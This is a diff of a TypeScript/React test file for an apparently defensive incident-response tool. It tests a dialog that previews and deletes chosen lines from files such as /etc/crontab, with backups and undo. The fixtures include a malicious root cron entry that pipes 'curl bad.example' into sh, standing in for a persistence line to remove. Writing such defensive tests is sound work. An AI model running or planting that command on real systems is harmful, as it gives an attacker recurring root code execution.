@@ -24,14 +24,17 @@ import {
 } from "./EmergencyCommandsPage";
 import { EmergencyPathBatchChoose, EmergencyPathBatchDialog, EmergencyPathBatchItems } from "./EmergencyPathBatchDialog";
 import { EmergencyPathDialog, EmergencyPathOutcome, EmergencyPathProperties, symbolicMode } from "./EmergencyPathDialog";
+import { EmergencyPathLinesDialog } from "./EmergencyPathLinesDialog";
 import { EmergencyPathMenu } from "./EmergencyPathMenu";
 
-const api: EmergencyCommandApi & import("../shared/file-evidence-contract").FileEvidenceApi & import("../shared/local-scan-contract").LocalScanApi = {
+const api: EmergencyCommandApi & import("../shared/file-evidence-contract").FileEvidenceApi & import("../shared/local-scan-contract").LocalScanApi & import("../shared/process-watch-contract").ProcessWatchApi = {
   fileEvidence: async () => { throw new Error(); },
   localScan: async () => { throw new Error(); },
   loadEmergencyCommandCatalog: async () => { throw new Error(); },
   runEmergencyCommand: async () => { throw new Error(); },
   inspectEmergencyPath: async () => { throw new Error(); },
+  previewEmergencyPathLines: async () => { throw new Error(); },
+  planEmergencyPathLines: async () => { throw new Error(); },
   planEmergencyPathAction: async () => { throw new Error(); },
   confirmEmergencyPathAction: async () => { throw new Error(); },
   executeEmergencyPathAction: async () => { throw new Error(); },
@@ -43,6 +46,18 @@ const api: EmergencyCommandApi & import("../shared/file-evidence-contract").File
   confirmEmergencyPathBatch: async () => { throw new Error(); },
   stepEmergencyPathBatch: async () => { throw new Error(); },
   cancelEmergencyPathBatch: async (): Promise<void> => { throw new Error(); },
+  probeProcessWatch: async () => { throw new Error(); },
+  startProcessWatch: async () => { throw new Error(); },
+  pollProcessWatch: async () => { throw new Error(); },
+  stopProcessWatch: async () => { throw new Error(); },
+  processWatchSummary: async () => { throw new Error(); },
+  pickProcessWatchTool: async () => { throw new Error(); },
+  planProcessWatchUpload: async () => { throw new Error(); },
+  startProcessWatchUpload: async () => { throw new Error(); },
+  listProcessWatchResidues: async () => { throw new Error(); },
+  cleanProcessWatchResidue: async () => { throw new Error(); },
+  listProcessWatchSources: async () => { throw new Error(); },
+  readProcessWatchAccounting: async () => { throw new Error(); },
 };
 
 const command: EmergencyCommandCatalogItem = {
@@ -74,7 +89,7 @@ const result: EmergencyCommandResult = {
   paths: [],
 };
 
-const offer = { pathHandle: "opaque-path", line: 1, path: "/usr/local/lib/pyshared/.helper" };
+const offer = { pathHandle: "opaque-path", line: 1, path: "/usr/local/lib/pyshared/.helper", lineEditable: false, xinetdService: false };
 
 describe("EmergencyCommandsPage", () => {
   it("renders an honest disconnected state", () => {
@@ -291,9 +306,73 @@ describe("EmergencyCommandsPage", () => {
     expect(html).toContain('role="menu"');
     expect(html).not.toContain("<em>");
     expect(html).toContain('role="separator"');
+    // This file is not in the managed set, so the delete entry stays hidden.
+    expect(html).not.toContain("删除指定行");
     // Every item leads to a plan the operator still has to read.
     expect(html).not.toContain("立即");
     expect(html).not.toContain("彻底删除");
+  });
+
+  it("offers line deletion only where the backend marked the path editable", () => {
+    const editable = renderToStaticMarkup(
+      <EmergencyPathMenu position={{ x: 10, y: 20 }} busy={false}
+        offer={{ ...offer, path: "/etc/crontab", lineEditable: true, xinetdService: false }}
+        onAction={() => undefined} onDismiss={() => undefined} />,
+    );
+    expect(editable).toContain("删除指定行…");
+    const plain = renderToStaticMarkup(
+      <EmergencyPathMenu position={{ x: 10, y: 20 }} busy={false}
+        offer={{ ...offer, path: "/etc/crontab", lineEditable: false, xinetdService: false }}
+        onAction={() => undefined} onDismiss={() => undefined} />,
+    );
+    expect(plain).not.toContain("删除指定行");
+  });
+
+  it("lets the operator read the picked lines before anything is deleted", () => {
+    const preview = {
+      previewHandle: "preview-one", pathHandle: offer.pathHandle, path: "/etc/crontab",
+      totalLines: 6, truncated: false,
+      lines: [
+        { number: 1, text: "SHELL=/bin/sh", clipped: false },
+        { number: 2, text: "* * * * * root curl bad.example | sh", clipped: false },
+        { number: 3, text: "", clipped: false },
+      ],
+    };
+    const html = renderToStaticMarkup(
+      <EmergencyPathLinesDialog path="/etc/crontab" preview={preview}
+        plan={null} receipt={null} busy={false} error={null}
+        onPlan={() => undefined} onBack={() => undefined} onConfirm={() => undefined}
+        onUndo={() => undefined} onClose={() => undefined} />,
+    );
+    expect(html).toContain("删除指定行");
+    expect(html).toContain("curl bad.example | sh");
+    // The comment-versus-delete distinction and the backup are stated up front.
+    expect(html).toContain("注释");
+    expect(html).toContain("lovelyres-backups");
+    expect(html).toContain("从第");
+    expect(html).toContain("到第");
+    expect(html).toContain("生成删除计划");
+    // Nothing confirms by default; the plan button needs a picked range.
+    expect(html).toContain('disabled="" data-testid="emergency-path-lines-plan"');
+
+    const plan = {
+      planHandle: "plan-one", pathHandle: offer.pathHandle, path: "/etc/crontab",
+      action: "delete-lines" as const, summary: "删除 /etc/crontab 第 2 行",
+      dangerous: true, restoreDescription: "放回删除前的完整文件",
+      state: "planned" as const, expiresInSeconds: 300, residue: null,
+      removedLines: [{ number: 2, text: "* * * * * root curl bad.example | sh", clipped: false }],
+    };
+    const planned = renderToStaticMarkup(
+      <EmergencyPathLinesDialog path="/etc/crontab" preview={preview}
+        plan={plan} receipt={null} busy={false} error={null}
+        onPlan={() => undefined} onBack={() => undefined} onConfirm={() => undefined}
+        onUndo={() => undefined} onClose={() => undefined} />,
+    );
+    expect(planned).toContain("将要删除 1 行");
+    expect(planned).toContain("将被删除的行");
+    expect(planned).toContain("确认并删除");
+    expect(planned).toContain("返回选择行");
+    expect(planned).toContain("sh -n");
   });
 
   it("shows what will happen before it happens, and what happened after", () => {
@@ -587,7 +666,9 @@ describe("EmergencyCommandsPage", () => {
         .test(readFileSync(new URL(name, directory), "utf8")));
     expect(users.sort()).toEqual([
       "EmergencyCommandsPage.tsx", "EmergencyPathBatchDialog.tsx", "EmergencyPathDialog.tsx",
+      "EmergencyPathLinesDialog.tsx",
       "EmergencyPathMenu.tsx", "FileEvidenceDialog.tsx", "LocalScanDialog.tsx", "LogRulesDialog.tsx",
+      "ProcessWatchPanel.tsx",
     ]);
     for (const name of users) {
       expect(readFileSync(new URL(name, directory), "utf8"), name).toContain('import "./emergency-path.css";');
